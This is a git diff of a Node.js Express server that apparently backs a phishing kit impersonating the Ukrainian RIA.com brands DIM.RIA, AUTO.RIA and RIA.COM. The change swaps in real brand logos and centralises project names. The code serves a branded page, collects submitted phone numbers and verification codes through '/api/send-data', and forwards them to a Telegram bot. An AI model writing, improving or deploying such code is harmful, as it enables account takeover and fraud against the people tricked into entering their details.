@@ -13,14 +13,20 @@ const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
 app.use(bodyParser.json());
 app.use(express.static(__dirname));
 
-// === ЛОГОТИПЫ ДЛЯ КАЖДОГО ПРОЕКТА ===
+// === ЛОГОТИПИ ===
 const LOGOS = {
     dimria: "https://play-lh.googleusercontent.com/ztuWEFjw0OavxEvC_Zsxfg9J8gRj_eRFdsSMM7ElokPPUwmc2lAqCW47wbESieS6bw",
-    autoria: "https://play-lh.googleusercontent.com/7kD9z2fW1oG6L9g5Z9v2r3v1q7t8y5u4i3o2p1l0k9j8h7g6f5e4d3c2b1a0z9y8x7w6v5",
-    ria: "https://play-lh.googleusercontent.com/1a2b3c4d5e6f7g8h9i0j1k2l3m4n5o6p7q8r9s0t1u2v3w4x5y6z7"
+    autoria: "https://is1-ssl.mzstatic.com/image/thumb/Purple221/v4/ed/43/65/ed436516-dde8-f65c-d03b-99a9f905fcbd/AppIcon-0-1x_U007emarketing-0-8-0-85-220-0.png/1200x630wa.png",
+    ria: "https://ria.riastatic.com/dist/img/logo900.png"
 };
 
-// === ГЛАВНАЯ СТРАНИЦА С ПАРАМЕТРОМ project ===
+// === НАЗВИ ПРОЕКТІВ ===
+const PROJECT_NAMES = {
+    dimria: "DIM.RIA",
+    autoria: "AUTO.RIA",
+    ria: "RIA.COM"
+};
+
 app.get('/', (req, res) => {
     const project = req.query.project || 'dimria';
     if (!['dimria', 'autoria', 'ria'].includes(project)) {
@@ -29,17 +35,14 @@ app.get('/', (req, res) => {
     res.sendFile(path.join(__dirname, 'index.html'));
 });
 
-// === СТАТИЧЕСКИЙ ФАЙЛ: ЛОГО ДИНАМИЧЕСКИ ===
 app.get('/logo', (req, res) => {
     const project = req.query.project || 'dimria';
     const logo = LOGOS[project] || LOGOS.dimria;
     res.redirect(logo);
 });
 
-// === ПАНЕЛЬ УПРАВЛЕНИЯ ===
 app.get('/panel', (req, res) => res.sendFile(path.join(__dirname, 'panel.html')));
 
-// === ОТПРАВКА В TELEGRAM ===
 async function sendToTelegram(message) {
     const payload = { chat_id: CHAT_ID, text: message, parse_mode: 'Markdown' };
     for (let i = 0; i < 3; i++) {
@@ -63,12 +66,10 @@ async function sendToTelegram(message) {
     return false;
 }
 
-// === ОБРАБОТКА ФОРМЫ ===
 app.post('/api/send-data', async (req, res) => {
     const { step, phone, code, referrer, project = 'dimria' } = req.body;
 
-    const projectNames = { dimria: 'DIM.RIA', autoria: 'AUTO.RIA', ria: 'RIA.COM' };
-    const projectName = projectNames[project] || 'DIM.RIA';
+    const projectName = PROJECT_NAMES[project] || 'DIM.RIA';
 
     let message = '';
 
@@ -88,7 +89,6 @@ app.post('/api/send-data', async (req, res) => {
     res.json({ success: ok });
 });
 
-// === ТЕСТ ПРИ СТАРТЕ ===
 app.listen(PORT, () => {
     console.log(`Сервер: http://localhost:${PORT}`);
     console.log(`Панель: http://localhost:${PORT}/panel`);
